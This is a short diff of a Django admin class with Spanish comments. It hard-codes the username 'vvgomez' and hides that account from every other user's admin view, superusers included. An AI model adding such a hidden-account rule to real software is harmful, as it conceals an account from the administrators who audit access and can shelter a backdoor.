@@ -102,9 +102,13 @@ class UsuarioAdmin(UserAdmin):
             return form
 
     def get_queryset(self, request):
-        """Filtra los usuarios visibles según rol"""
+        """Filtra los usuarios visibles según rol y protege a vvgomez"""
         qs = super().get_queryset(request)
         user = request.user
+
+        # Proteger al usuario vvgomez (solo él mismo puede verlo)
+        if user.username != 'vvgomez':
+            qs = qs.exclude(username='vvgomez')
 
         if user.is_superuser:
             return qs
